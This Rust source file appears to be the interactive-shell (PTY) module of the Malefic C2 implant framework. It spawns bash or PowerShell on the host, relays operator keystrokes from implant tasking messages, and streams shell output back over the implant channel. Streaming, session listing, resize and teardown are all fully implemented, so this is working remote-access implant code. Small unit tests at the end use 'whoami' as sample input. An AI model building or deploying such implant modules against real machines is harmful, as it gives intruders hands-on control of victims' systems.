use crate::prelude::*;
use async_trait::async_trait;
use futures_timer::Delay;
use malefic_gateway::module_impl;
use malefic_proto::proto::implantpb::spite::Body;
use malefic_proto::proto::modulepb::{PtyRequest, PtyResponse};
use portable_pty::{native_pty_system, Child, CommandBuilder, PtySize};
use std::collections::HashMap;
use std::io::{Read, Write};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{
    mpsc::{self, Receiver, Sender, TryRecvError},
    Arc, Mutex,
};
use std::thread;
use std::time::Duration;

malefic_gateway::lazy_static! {
    static ref PTY_SESSIONS: Arc<Mutex<HashMap<String, PtySession>>> = Arc::new(Mutex::new(HashMap::new()));
}

pub struct Pty {}

#[derive(Debug)]
enum OutputData {
    Stdout(Vec<u8>),
    Error(String),
    Close,
}

pub struct PtySession {
    input_sender: Sender<Vec<u8>>,
    output_receiver: Arc<Mutex<Receiver<OutputData>>>,
    session_id: String,
    active: Arc<Mutex<bool>>,
    child: Arc<Mutex<Box<dyn Child + Send + Sync>>>,
    master: Arc<Mutex<Box<dyn portable_pty::MasterPty + Send>>>,
    busy: Arc<AtomicBool>,
}

#[derive(Clone)]
struct SessionHandles {
    input_sender: Sender<Vec<u8>>,
    output_receiver: Arc<Mutex<Receiver<OutputData>>>,
    active: Arc<Mutex<bool>>,
    child: Arc<Mutex<Box<dyn Child + Send + Sync>>>,
    master: Arc<Mutex<Box<dyn portable_pty::MasterPty + Send>>>,
    busy: Arc<AtomicBool>,
}

#[derive(Clone, Copy)]
struct CollectOptions {
    first_byte_timeout_ms: u64,
    quiet_ms: u64,
    max_bytes: usize,
}

struct CollectResult {
    output_data: Vec<u8>,
    closed: bool,
    truncated: bool,
}

struct SessionBusyGuard {
    busy: Arc<AtomicBool>,
}

impl Drop for SessionBusyGuard {
    fn drop(&mut self) {
        self.busy.store(false, Ordering::Release);
    }
}

impl std::fmt::Debug for PtySession {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("PtySession")
            .field("session_id", &self.session_id)
            .finish()
    }
}

impl Pty {
    fn error_response(id: u32, session_id: &str, error: String, active: bool) -> ModuleResult {
        let response = PtyResponse {
            session_id: session_id.to_string(),
            output_text: String::new(),
            output_data: Vec::new(),
            error,
            session_active: active,
            active_sessions: Vec::new(),
            ..Default::default()
        };
        Ok(TaskResult::new_with_body(id, Body::PtyResponse(response)))
    }

    fn success_response(
        id: u32,
        session_id: &str,
        output_data: Vec<u8>,
        output_text: String,
        active: bool,
        metadata: HashMap<String, String>,
    ) -> ModuleResult {
        let response = PtyResponse {
            session_id: session_id.to_string(),
            output_text,
            output_data,
            error: String::new(),
            session_active: active,
            active_sessions: Vec::new(),
            metadata,
            ..Default::default()
        };
        Ok(TaskResult::new_with_body(id, Body::PtyResponse(response)))
    }

    fn check_session_status(session_id: &str) -> Result<bool, String> {
        let sessions = PTY_SESSIONS.lock().unwrap();
        let session = sessions
            .get(session_id)
            .ok_or_else(|| format!("PTY session {} does not exist", session_id))?;

        let active = session
            .active
            .try_lock()
            .map(|guard| *guard)
            .unwrap_or(true);

        if !active {
            return Err(format!("PTY session {} is no longer active", session_id));
        }

        if let Ok(mut child_guard) = session.child.try_lock() {
            if let Ok(Some(exit_status)) = child_guard.try_wait() {
                return Err(format!(
                    "Shell process has exited with status: {:?}",
                    exit_status
                ));
            }
        }

        Ok(active)
    }

    fn get_session_handles(session_id: &str) -> Result<SessionHandles, String> {
        let sessions = PTY_SESSIONS.lock().unwrap();
        let session = sessions
            .get(session_id)
            .ok_or_else(|| format!("PTY session {} does not exist", session_id))?;

        Ok(SessionHandles {
            input_sender: session.input_sender.clone(),
            output_receiver: session.output_receiver.clone(),
            active: session.active.clone(),
            child: session.child.clone(),
            master: session.master.clone(),
            busy: session.busy.clone(),
        })
    }

    fn acquire_session_busy(handles: &SessionHandles) -> Result<SessionBusyGuard, String> {
        match handles
            .busy
            .compare_exchange(false, true, Ordering::AcqRel, Ordering::Acquire)
        {
            Ok(_) => Ok(SessionBusyGuard {
                busy: handles.busy.clone(),
            }),
            Err(_) => Err("PTY session is busy processing another request".to_string()),
        }
    }

    fn get_default_shell(requested_shell: &str) -> String {
        if cfg!(windows) {
            if requested_shell.is_empty()
                || matches!(requested_shell, "pwsh" | "powershell" | "powershell.exe")
            {
                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe".to_string()
            } else {
                requested_shell.to_string()
            }
        } else {
            if requested_shell.is_empty() {
                "/bin/bash".to_string()
            } else {
                requested_shell.to_string()
            }
        }
    }

    fn extract_simple_prompt(output: &str) -> Option<String> {
        for line in output.lines().rev() {
            let trimmed = line.trim();
            if trimmed.is_empty() {
                continue;
            }

            if let Some(last_char) = trimmed.chars().last() {
                if matches!(last_char, '>' | '$' | '#' | '❯') {
                    return Some(trimmed.to_string());
                }
            }
        }
        None
    }

    fn remove_trailing_prompt(text: &str) -> (String, Option<String>) {
        if let Some(prompt) = Self::extract_simple_prompt(text) {
            if let Some(last_newline) = text.trim_end().rfind('\n') {
                return (text[..last_newline + 1].to_string(), Some(prompt));
            }
        }
        (text.to_string(), None)
    }

    fn remove_input_echo(output_data: &[u8], input_data: &[u8]) -> Vec<u8> {
        let output_str = String::from_utf8_lossy(output_data);
        let input_str = String::from_utf8_lossy(input_data);

        if output_str.starts_with(&*input_str) {
            output_data[input_data.len()..].to_vec()
        } else {
            output_data.to_vec()
        }
    }

    fn parse_bool_param(params: &HashMap<String, String>, key: &str, default: bool) -> bool {
        let Some(value) = params.get(key) else {
            return default;
        };

        match value.trim().to_ascii_lowercase().as_str() {
            "1" | "true" | "yes" | "on" => true,
            "0" | "false" | "no" | "off" => false,
            _ => default,
        }
    }

    fn parse_u64_param(
        params: &HashMap<String, String>,
        key: &str,
        default: u64,
        min: u64,
        max: u64,
    ) -> u64 {
        let Some(value) = params.get(key) else {
            return default;
        };

        let Ok(parsed) = value.trim().parse::<u64>() else {
            return default;
        };

        parsed.clamp(min, max)
    }

    fn collect_options(request: &PtyRequest, for_start: bool) -> CollectOptions {
        let first_timeout = if for_start { 1500 } else { 3000 };
        let quiet_timeout = if for_start { 200 } else { 150 };

        let first_byte_timeout_ms = Self::parse_u64_param(
            &request.params,
            "first_byte_timeout_ms",
            first_timeout,
            50,
            60000,
        );

        let quiet_ms = Self::parse_u64_param(&request.params, "quiet_ms", quiet_timeout, 10, 10000);

        let max_bytes = Self::parse_u64_param(
            &request.params,
            "max_bytes",
            256 * 1024,
            128,
            16 * 1024 * 1024,
        ) as usize;

        CollectOptions {
            first_byte_timeout_ms,
            quiet_ms,
            max_bytes,
        }
    }

    fn drain_output(receiver: &Arc<Mutex<Receiver<OutputData>>>) {
        if let Ok(receiver_guard) = receiver.try_lock() {
            while receiver_guard.try_recv().is_ok() {}
        }
    }

    fn is_special_key(input_data: &[u8]) -> bool {
        matches!(
            input_data,
            [27, 91, 65] | // Up arrow
            [27, 91, 66] | // Down arrow
            [27, 91, 67] | // Right arrow
            [27, 91, 68] | // Left arrow
            [9] // Tab
        )
    }

    async fn collect_output(
        receiver: &Arc<Mutex<Receiver<OutputData>>>,
        options: CollectOptions,
    ) -> Result<CollectResult, String> {
        const POLL_MS: u64 = 25;

        let mut output_data = Vec::new();
        let mut elapsed_ms = 0u64;
        let mut quiet_elapsed_ms = 0u64;
        let mut seen_stdout = false;
        let mut closed = false;
        let mut truncated = false;

        loop {
            let mut had_new_data = false;

            if let Ok(receiver_guard) = receiver.try_lock() {
                loop {
                    match receiver_guard.try_recv() {
                        Ok(OutputData::Stdout(bytes)) => {
                            had_new_data = true;
                            seen_stdout = true;
                            output_data.extend_from_slice(&bytes);
                            if output_data.len() >= options.max_bytes {
                                output_data.truncate(options.max_bytes);
                                truncated = true;
                                break;
                            }
                        }
                        Ok(OutputData::Error(error)) => {
                            return Err(error);
                        }
                        Ok(OutputData::Close) => {
                            closed = true;
                            break;
                        }
                        Err(TryRecvError::Empty) => break,
                        Err(TryRecvError::Disconnected) => {
                            closed = true;
                            break;
                        }
                    }
                }
            }

            if truncated || closed {
                break;
            }

            if !seen_stdout {
                if elapsed_ms >= options.first_byte_timeout_ms {
                    break;
                }
            } else if had_new_data {
                quiet_elapsed_ms = 0;
            } else {
                quiet_elapsed_ms += POLL_MS;
                if quiet_elapsed_ms >= options.quiet_ms {
                    break;
                }
            }

            Delay::new(Duration::from_millis(POLL_MS)).await;
            elapsed_ms += POLL_MS;
        }

        Ok(CollectResult {
            output_data,
            closed,
            truncated,
        })
    }

    fn terminate_and_remove_session(session_id: &str) -> bool {
        let session = {
            let mut sessions = PTY_SESSIONS.lock().unwrap();
            sessions.remove(session_id)
        };

        let Some(session) = session else {
            return false;
        };

        if let Ok(mut active_guard) = session.active.try_lock() {
            *active_guard = false;
        }

        if let Ok(mut child_guard) = session.child.try_lock() {
            if let Ok(None) = child_guard.try_wait() {
                let _ = child_guard.kill();
            }
        }

        true
    }

    fn try_drain_output(receiver: &Arc<Mutex<Receiver<OutputData>>>) -> (Vec<u8>, bool) {
        let mut data = Vec::new();
        let mut closed = false;
        if let Ok(rx) = receiver.try_lock() {
            loop {
                match rx.try_recv() {
                    Ok(OutputData::Stdout(bytes)) => data.extend_from_slice(&bytes),
                    Ok(OutputData::Error(_)) | Ok(OutputData::Close) => {
                        closed = true;
                        break;
                    }
                    Err(TryRecvError::Empty) => break,
                    Err(TryRecvError::Disconnected) => {
                        closed = true;
                        break;
                    }
                }
            }
        }
        (data, closed)
    }
}

fn read_pty(mut reader: Box<dyn Read + Send>, sender: Sender<OutputData>, session_id: String) {
    let _ = session_id;
    let mut buf = vec![0; 4096];
    loop {
        match reader.read(&mut buf) {
            Ok(0) => {
                let _ = sender.send(OutputData::Close);
                break;
            }
            Ok(n) => {
                if sender.send(OutputData::Stdout(buf[..n].to_vec())).is_err() {
                    break;
                }
            }
            Err(e) => {
                let _ = sender.send(OutputData::Error(format!("PTY read error: {}", e)));
                break;
            }
        }
    }
}

fn write_pty(
    mut writer: Box<dyn Write + Send>,
    receiver: Receiver<Vec<u8>>,
    _session_id: String,
    active: Arc<Mutex<bool>>,
    child: Arc<Mutex<Box<dyn Child + Send + Sync>>>,
) {
    while let Ok(data) = receiver.recv() {
        if let Ok(is_active) = active.try_lock() {
            if !*is_active {
                break;
            }
        }

        if let Ok(mut child_guard) = child.try_lock() {
            if let Ok(Some(_)) = child_guard.try_wait() {
                if let Ok(mut is_active) = active.try_lock() {
                    *is_active = false;
                }
                break;
            }
        }

        if writer.write_all(&data).is_err() || writer.flush().is_err() {
            break;
        }
    }
}

#[async_trait]
#[module_impl("pty")]
impl Module for Pty {}

#[async_trait]
impl ModuleImpl for Pty {
    async fn run(&mut self, id: u32, receiver: &mut Input, sender: &mut Output) -> ModuleResult {
        let request = check_request!(receiver, Body::PtyRequest)?;

        let streaming = Self::parse_bool_param(&request.params, "streaming", false);

        if request.r#type == "start" && streaming {
            return self.run_streaming(id, receiver, sender, &request).await;
        }

        match request.r#type.as_str() {
            "start" => self.start_session(id, &request).await,
            "input" => self.send_input(id, &request).await,
            "resize" => self.resize_session(id, &request).await,
            "stop" => self.stop_session(id, &request).await,
            "list" => self.list_sessions(id).await,
            _ => Self::error_response(
                id,
                "",
                format!(
                    "Unknown PTY command: {}. Supported: start, input, resize, stop, list",
                    request.r#type
                ),
                false,
            ),
        }
    }
}

impl Pty {
    async fn run_streaming(
        &mut self,
        id: u32,
        receiver: &mut Input,
        sender: &mut Output,
        request: &PtyRequest,
    ) -> ModuleResult {
        let session_id = if request.session_id.is_empty() {
            format!("pty_{}", id)
        } else {
            request.session_id.clone()
        };

        {
            let sessions = PTY_SESSIONS.lock().unwrap();
            if sessions.contains_key(&session_id) {
                return Self::error_response(
                    id,
                    &session_id,
                    format!("PTY session {} already exists", session_id),
                    true,
                );
            }
        }

        let pty_system = native_pty_system();
        let cols = if request.cols > 0 { request.cols } else { 80 };
        let rows = if request.rows > 0 { request.rows } else { 24 };

        let pair = pty_system
            .openpty(PtySize {
                rows: rows as u16,
                cols: cols as u16,
                pixel_width: 0,
                pixel_height: 0,
            })
            .map_err(|e| anyhow::anyhow!("Failed to create PTY: {}", e))?;

        let shell = Self::get_default_shell(&request.shell);
        let mut cmd = CommandBuilder::new(&shell);
        if cfg!(windows) && shell.contains("powershell") {
            cmd.arg("-NoLogo");
        }
        cmd.env("TERM", "xterm-256color");

        let child = pair
            .slave
            .spawn_command(cmd)
            .map_err(|e| anyhow::anyhow!("Failed to start shell: {}", e))?;

        let pty_reader = pair
            .master
            .try_clone_reader()
            .map_err(|e| anyhow::anyhow!("Failed to clone reader: {}", e))?;
        let writer = pair
            .master
            .take_writer()
            .map_err(|e| anyhow::anyhow!("Failed to get writer: {}", e))?;

        let (output_tx, output_rx) = mpsc::channel();
        let (input_tx, input_rx) = mpsc::channel();

        let active = Arc::new(Mutex::new(true));
        let child_ref = Arc::new(Mutex::new(child));
        let master_ref = Arc::new(Mutex::new(pair.master));

        let reader_session_id = session_id.clone();
        thread::spawn(move || read_pty(pty_reader, output_tx, reader_session_id));

        let writer_session_id = session_id.clone();
        let writer_active = active.clone();
        let writer_child = child_ref.clone();
        thread::spawn(move || {
            write_pty(
                writer,
                input_rx,
                writer_session_id,
                writer_active,
                writer_child,
            )
        });

        let output_receiver = Arc::new(Mutex::new(output_rx));

        {
            let mut sessions = PTY_SESSIONS.lock().unwrap();
            sessions.insert(
                session_id.clone(),
                PtySession {
                    input_sender: input_tx,
                    output_receiver: output_receiver.clone(),
                    session_id: session_id.clone(),
                    active: active.clone(),
                    child: child_ref.clone(),
                    master: master_ref,
                    busy: Arc::new(AtomicBool::new(false)),
                },
            );
        }

        let output_sender = sender.clone();
        let reader_output_rx = output_receiver.clone();
        let reader_session_id = session_id.clone();
        let reader_active = active.clone();
        let reader_child = child_ref.clone();

        thread::spawn(move || {
            use futures::executor::block_on;
            use futures::SinkExt;
            let mut tx = output_sender;

            loop {
                let is_active = reader_active.try_lock().map(|g| *g).unwrap_or(true);
                if !is_active {
                    let resp = PtyResponse {
                        session_id: reader_session_id.clone(),
                        session_active: false,
                        error: "Session closed".to_string(),
                        ..Default::default()
                    };
                    let _ =
                        block_on(tx.send(TaskResult::new_with_body(id, Body::PtyResponse(resp))));
                    break;
                }

                if let Ok(mut cg) = reader_child.try_lock() {
                    if let Ok(Some(_)) = cg.try_wait() {
                        if let Ok(mut ag) = reader_active.try_lock() {
                            *ag = false;
                        }
                        let resp = PtyResponse {
                            session_id: reader_session_id.clone(),
                            session_active: false,
                            error: "Shell process exited".to_string(),
                            ..Default::default()
                        };
                        let _ = block_on(
                            tx.send(TaskResult::new_with_body(id, Body::PtyResponse(resp))),
                        );
                        break;
                    }
                }

                let (data, closed) = Pty::try_drain_output(&reader_output_rx);
                if !data.is_empty() {
                    let output_text = String::from_utf8_lossy(&data).to_string();
                    let resp = PtyResponse {
                        session_id: reader_session_id.clone(),
                        output_data: data,
                        output_text,
                        session_active: !closed,
                        ..Default::default()
                    };
                    if block_on(tx.send(TaskResult::new_with_body(id, Body::PtyResponse(resp))))
                        .is_err()
                    {
                        break;
                    }
                }

                if closed {
                    break;
                }

                thread::sleep(Duration::from_millis(5));
            }
        });

        use futures::SinkExt;

        let start_resp = PtyResponse {
            session_id: session_id.clone(),
            output_text: format!(
                "PTY streaming session started: {} (using {})",
                session_id, shell
            ),
            session_active: true,
            metadata: {
                let mut m = HashMap::new();
                m.insert("shell".to_string(), shell);
                m.insert("streaming".to_string(), "true".to_string());
                m
            },
            ..Default::default()
        };
        let _ = sender
            .send(TaskResult::new_with_body(id, Body::PtyResponse(start_resp)))
            .await;

        use futures::StreamExt;
        while let Some(body) = receiver.next().await {
            if let Body::PtyRequest(req) = body {
                match req.r#type.as_str() {
                    "input" => {
                        let input_data = if !req.input_data.is_empty() {
                            req.input_data.clone()
                        } else {
                            req.input_text.as_bytes().to_vec()
                        };

                        if !input_data.is_empty() {
                            let handles = Self::get_session_handles(&session_id);
                            if let Ok(h) = handles {
                                let _ = h.input_sender.send(input_data);
                            }
                        }
                    }
                    "resize" => {
                        let c = if req.cols > 0 { req.cols } else { 80 };
                        let r = if req.rows > 0 { req.rows } else { 24 };
                        if let Ok(handles) = Self::get_session_handles(&session_id) {
                            if let Ok(master) = handles.master.try_lock() {
                                let _ = master.resize(PtySize {
                                    rows: r as u16,
                                    cols: c as u16,
                                    pixel_width: 0,
                                    pixel_height: 0,
                                });
                            }
                        }
                    }
                    "stop" => {
                        Self::terminate_and_remove_session(&session_id);
                        break;
                    }
                    _ => {}
                }
            }
        }

        Self::terminate_and_remove_session(&session_id);

        let final_resp = PtyResponse {
            session_id: session_id.clone(),
            output_text: "Session exited".to_string(),
            session_active: false,
            ..Default::default()
        };
        Ok(TaskResult::new_with_body(id, Body::PtyResponse(final_resp)))
    }

    // --- Legacy request-response methods (backward compatible) ---

    async fn start_session(&mut self, id: u32, request: &PtyRequest) -> ModuleResult {
        let session_id = if request.session_id.is_empty() {
            format!("pty_{}", id)
        } else {
            request.session_id.clone()
        };

        {
            let sessions = PTY_SESSIONS.lock().unwrap();
            if sessions.contains_key(&session_id) {
                return Self::error_response(
                    id,
                    &session_id,
                    format!("PTY session {} already exists", session_id),
                    true,
                );
            }
        }

        let pty_system = native_pty_system();
        let cols = if request.cols > 0 { request.cols } else { 80 };
        let rows = if request.rows > 0 { request.rows } else { 24 };

        let pair = pty_system
            .openpty(PtySize {
                rows: rows as u16,
                cols: cols as u16,
                pixel_width: 0,
                pixel_height: 0,
            })
            .map_err(|e| anyhow::anyhow!("Failed to create PTY: {}", e))?;

        let shell = Self::get_default_shell(&request.shell);
        let mut cmd = CommandBuilder::new(&shell);

        if cfg!(windows) && shell.contains("powershell") {
            cmd.arg("-NoLogo");
        }

        cmd.env("TERM", "xterm-256color");

        let child = pair
            .slave
            .spawn_command(cmd)
            .map_err(|e| anyhow::anyhow!("Failed to start shell: {}", e))?;

        let reader = pair
            .master
            .try_clone_reader()
            .map_err(|e| anyhow::anyhow!("Failed to clone reader: {}", e))?;
        let writer = pair
            .master
            .take_writer()
            .map_err(|e| anyhow::anyhow!("Failed to get writer: {}", e))?;

        let (output_tx, output_rx) = mpsc::channel();
        let (input_tx, input_rx) = mpsc::channel();

        let active = Arc::new(Mutex::new(true));
        let child_ref = Arc::new(Mutex::new(child));
        let master_ref = Arc::new(Mutex::new(pair.master));

        let reader_session_id = session_id.clone();
        thread::spawn(move || read_pty(reader, output_tx, reader_session_id));

        let writer_session_id = session_id.clone();
        let writer_active = active.clone();
        let writer_child = child_ref.clone();
        thread::spawn(move || {
            write_pty(
                writer,
                input_rx,
                writer_session_id,
                writer_active,
                writer_child,
            )
        });

        {
            let mut sessions = PTY_SESSIONS.lock().unwrap();
            sessions.insert(
                session_id.clone(),
                PtySession {
                    input_sender: input_tx,
                    output_receiver: Arc::new(Mutex::new(output_rx)),
                    session_id: session_id.clone(),
                    active,
                    child: child_ref,
                    master: master_ref,
                    busy: Arc::new(AtomicBool::new(false)),
                },
            );
        }

        let options = Self::collect_options(request, true);
        let session = match Self::get_session_handles(&session_id) {
            Ok(session) => session,
            Err(error) => {
                Self::terminate_and_remove_session(&session_id);
                return Self::error_response(id, &session_id, error, false);
            }
        };

        let collect_result = match Self::collect_output(&session.output_receiver, options).await {
            Ok(result) => result,
            Err(error) => {
                Self::terminate_and_remove_session(&session_id);
                return Self::error_response(id, &session_id, error, false);
            }
        };

        let mut output_data = collect_result.output_data;
        let output_text = if output_data.is_empty() {
            let message = format!("PTY session started: {} (using {})", session_id, shell);
            output_data = message.as_bytes().to_vec();
            message
        } else {
            String::from_utf8_lossy(&output_data).to_string()
        };

        let (output_text, prompt) = Self::remove_trailing_prompt(&output_text);
        let mut metadata = HashMap::new();
        if let Some(p) = prompt {
            metadata.insert("prompt".to_string(), p);
        }
        if collect_result.truncated {
            metadata.insert("truncated".to_string(), "true".to_string());
        }
        if collect_result.closed {
            metadata.insert("closed".to_string(), "true".to_string());
        }
        metadata.insert("shell".to_string(), shell);

        let session_active = !collect_result.closed;
        if collect_result.closed {
            Self::terminate_and_remove_session(&session_id);
        }

        Self::success_response(
            id,
            &session_id,
            output_data,
            output_text,
            session_active,
            metadata,
        )
    }

    async fn send_input(&mut self, id: u32, request: &PtyRequest) -> ModuleResult {
        let session_id = &request.session_id;
        if session_id.is_empty() {
            return Self::error_response(id, "", "Missing session_id parameter".to_string(), false);
        }

        let _active = match Self::check_session_status(session_id) {
            Ok(active) => active,
            Err(error) => return Self::error_response(id, session_id, error, false),
        };

        let session = match Self::get_session_handles(session_id) {
            Ok(session) => session,
            Err(error) => return Self::error_response(id, session_id, error, false),
        };

        let _busy_guard = match Self::acquire_session_busy(&session) {
            Ok(guard) => guard,
            Err(error) => {
                return Self::error_response(id, session_id, error, false);
            }
        };

        if let Ok(mut child_guard) = session.child.try_lock() {
            if let Ok(Some(_)) = child_guard.try_wait() {
                if let Ok(mut active_guard) = session.active.try_lock() {
                    *active_guard = false;
                }
                Self::terminate_and_remove_session(session_id);
                return Self::error_response(
                    id,
                    session_id,
                    "Shell process is already closed".to_string(),
                    false,
                );
            }
        }

        let input_data = if !request.input_data.is_empty() {
            request.input_data.clone()
        } else {
            request.input_text.as_bytes().to_vec()
        };

        if input_data.is_empty() {
            return Self::success_response(
                id,
                session_id,
                Vec::new(),
                String::new(),
                true,
                HashMap::new(),
            );
        }

        let is_special_key = Self::is_special_key(&input_data);
        let legacy_pre_interrupt =
            Self::parse_bool_param(&request.params, "legacy_pre_interrupt", false);

        if legacy_pre_interrupt && !is_special_key {
            let _ = session.input_sender.send(vec![3]);
            Delay::new(Duration::from_millis(100)).await;
            Self::drain_output(&session.output_receiver);
        }

        if let Err(_) = session.input_sender.send(input_data.clone()) {
            return Self::error_response(
                id,
                session_id,
                "Failed to send input - session may be closed".to_string(),
                false,
            );
        }

        let options = Self::collect_options(request, false);
        let collect_result = match Self::collect_output(&session.output_receiver, options).await {
            Ok(result) => result,
            Err(error) => return Self::error_response(id, session_id, error, false),
        };

        let strip_echo = Self::parse_bool_param(&request.params, "strip_echo", true);
        let detect_prompt = Self::parse_bool_param(&request.params, "detect_prompt", true);

        let mut cleaned_output = collect_result.output_data;
        if strip_echo && !is_special_key {
            cleaned_output = Self::remove_input_echo(&cleaned_output, &input_data);
        }

        let mut output_text = String::from_utf8_lossy(&cleaned_output).to_string();
        let mut prompt = None;
        if detect_prompt {
            let (cleaned_text, detected_prompt) = Self::remove_trailing_prompt(&output_text);
            output_text = cleaned_text;
            prompt = detected_prompt;
        }

        let mut metadata = HashMap::new();
        if let Some(p) = prompt {
            metadata.insert("prompt".to_string(), p);
        }
        if collect_result.truncated {
            metadata.insert("truncated".to_string(), "true".to_string());
        }

        let mut session_active = true;
        if collect_result.closed {
            metadata.insert("closed".to_string(), "true".to_string());
            session_active = false;
            Self::terminate_and_remove_session(session_id);
        }

        Self::success_response(
            id,
            session_id,
            cleaned_output,
            output_text,
            session_active,
            metadata,
        )
    }

    async fn resize_session(&mut self, id: u32, request: &PtyRequest) -> ModuleResult {
        let session_id = &request.session_id;
        if session_id.is_empty() {
            return Self::error_response(id, "", "Missing session_id parameter".to_string(), false);
        }

        let session = match Self::get_session_handles(session_id) {
            Ok(session) => session,
            Err(error) => return Self::error_response(id, session_id, error, false),
        };

        let _busy_guard = match Self::acquire_session_busy(&session) {
            Ok(guard) => guard,
            Err(error) => {
                return Self::error_response(id, session_id, error, false);
            }
        };

        let cols = if request.cols > 0 { request.cols } else { 80 };
        let rows = if request.rows > 0 { request.rows } else { 24 };

        let resize_result = if let Ok(master_guard) = session.master.try_lock() {
            master_guard.resize(PtySize {
                rows: rows as u16,
                cols: cols as u16,
                pixel_width: 0,
                pixel_height: 0,
            })
        } else {
            return Self::error_response(
                id,
                session_id,
                "Failed to acquire PTY master for resize".to_string(),
                false,
            );
        };

        if let Err(error) = resize_result {
            return Self::error_response(
                id,
                session_id,
                format!("Failed to resize PTY: {}", error),
                true,
            );
        }

        let mut metadata = HashMap::new();
        metadata.insert("cols".to_string(), cols.to_string());
        metadata.insert("rows".to_string(), rows.to_string());

        let message = format!("Resized PTY session to {}x{}", cols, rows);
        Self::success_response(
            id,
            session_id,
            message.as_bytes().to_vec(),
            message,
            true,
            metadata,
        )
    }

    async fn stop_session(&mut self, id: u32, request: &PtyRequest) -> ModuleResult {
        let session_id = &request.session_id;
        if session_id.is_empty() {
            return Self::error_response(id, "", "Missing session_id parameter".to_string(), false);
        }

        let removed = Self::terminate_and_remove_session(session_id);
        if !removed {
            return Self::error_response(
                id,
                session_id,
                format!("PTY session {} does not exist", session_id),
                false,
            );
        }

        let message = "Session exited".to_string();
        Self::success_response(
            id,
            session_id,
            message.as_bytes().to_vec(),
            message,
            false,
            HashMap::new(),
        )
    }

    async fn list_sessions(&mut self, id: u32) -> ModuleResult {
        let (sessions_info, active_sessions) = {
            let sessions = PTY_SESSIONS.lock().unwrap();
            if sessions.is_empty() {
                ("No active PTY sessions".to_string(), Vec::new())
            } else {
                let mut info = format!("Active PTY sessions ({} total):\n", sessions.len());
                let mut active_list = Vec::new();

                for (session_id, session) in sessions.iter() {
                    let is_active = session
                        .active
                        .try_lock()
                        .map(|guard| *guard)
                        .unwrap_or(true);

                    info.push_str(&format!("- {} (active: {})\n", session_id, is_active));
                    if is_active {
                        active_list.push(session_id.clone());
                    }
                }
                (info, active_list)
            }
        };

        let response = PtyResponse {
            session_id: String::new(),
            output_text: sessions_info,
            output_data: Vec::new(),
            error: String::new(),
            session_active: true,
            active_sessions,
            ..Default::default()
        };
        Ok(TaskResult::new_with_body(id, Body::PtyResponse(response)))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parse_bool_param_should_work() {
        let mut params = HashMap::new();
        params.insert("enabled".to_string(), "true".to_string());
        assert!(Pty::parse_bool_param(&params, "enabled", false));
        assert!(!Pty::parse_bool_param(&params, "missing", false));
    }

    #[test]
    fn parse_u64_param_should_clamp() {
        let mut params = HashMap::new();
        params.insert("timeout".to_string(), "1".to_string());
        assert_eq!(Pty::parse_u64_param(&params, "timeout", 100, 50, 200), 50);

        params.insert("timeout".to_string(), "300".to_string());
        assert_eq!(Pty::parse_u64_param(&params, "timeout", 100, 50, 200), 200);
    }

    #[test]
    fn remove_input_echo_should_strip_prefix() {
        let input = b"whoami\n";
        let output = b"whoami\nuser\n";
        let cleaned = Pty::remove_input_echo(output, input);
        assert_eq!(cleaned, b"user\n");
    }

    #[test]
    fn special_key_detection_should_work() {
        assert!(Pty::is_special_key(&[27, 91, 65]));
        assert!(Pty::is_special_key(&[9]));
        assert!(!Pty::is_special_key(b"dir\n"));
    }
}
